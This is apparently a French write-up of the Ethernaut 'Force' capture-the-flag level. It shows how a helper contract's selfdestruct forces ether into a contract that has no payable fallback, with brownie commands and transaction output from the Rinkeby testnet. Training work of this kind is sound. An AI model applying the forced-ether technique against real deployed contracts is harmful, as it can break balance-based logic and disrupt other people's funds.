# Force

## Objectif
L'objectif de ce challenge est que la balance du contrat soit supérieure à zéro

## Contract

Le contrat ne contient pas de code.
Il ne définit donc pas de fonction `fallback` `payable` qui lui permet de recevoir des fonds:
```console
>>> force = Force.deploy({'from': accounts[0]})
Transaction sent: 0xa66e9baf0da8b3fc92a46802addeee5cdec094cf525052339676ed8749810f49
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Force.constructor confirmed   Block: 1   Gas used: 67066 (0.56%)
  Force deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87

>>> hacker = accounts[1]
>>> hacker.transfer(to=force, amount="1 ether")
Transaction sent: 0x40ffed503a13b6d7fc00fb7ba8a9f8419302a5486fff9b2b3696285950e33fa8
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Transaction confirmed (reverted)   Block: 2   Gas used: 21024 (0.18%)

<Transaction '0x40ffed503a13b6d7fc00fb7ba8a9f8419302a5486fff9b2b3696285950e33fa8'>
```

Pour les smart contracts, `solidity` fournit le mot clé [`selfdestruct`](https://docs.soliditylang.org/en/v0.8.13/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct) qui a la particularité d'envoyer les fonds du contrat à l'adresse donnée en paramètre.

En utilisant un contrat intermédiaire il est possible d'appeller le [`selfdestruct`](./contracts/forceAttack.sol#9)

## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `rinkeby`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run scripts/attack.py main "0xD24f87F5dC5E3006C19B41867456206f71628945" --network rinkeby
```
```console
Brownie v1.18.1 - Python development framework for Ethereum

ForceProject is the active project.

Running 'scripts/attack.py::main'...
Transaction sent: 0x7e470f271029f2ae5f955b29c2f1467d22a16a4e816e3deaf236424bd2eaca3e
  Gas price: 1.000000014 gwei   Gas limit: 102210   Nonce: 232
  ForceAttack.constructor confirmed   Block: 10407428   Gas used: 92919 (90.91%)
  ForceAttack deployed at: 0xa1227d12464Ae7b7406F85EA15830360DA525545

Transfer to attack
Transaction sent: 0x700240944be51500968c465083926f0e846aedadcfbe8e69ab17fa270eec2422
  Gas price: 1.000000014 gwei   Gas limit: 23160   Nonce: 233
  Transaction confirmed   Block: 10407429   Gas used: 21055 (90.91%)

Destroy attack
Transaction sent: 0x036dd891252c1683ec14ae0df3097b097333674e787ea5a6f1c9dc41663f3077
  Gas price: 1.000000014 gwei   Gas limit: 32204   Nonce: 234
  ForceAttack.destroy confirmed   Block: 10407430   Gas used: 29277 (90.91%)
```
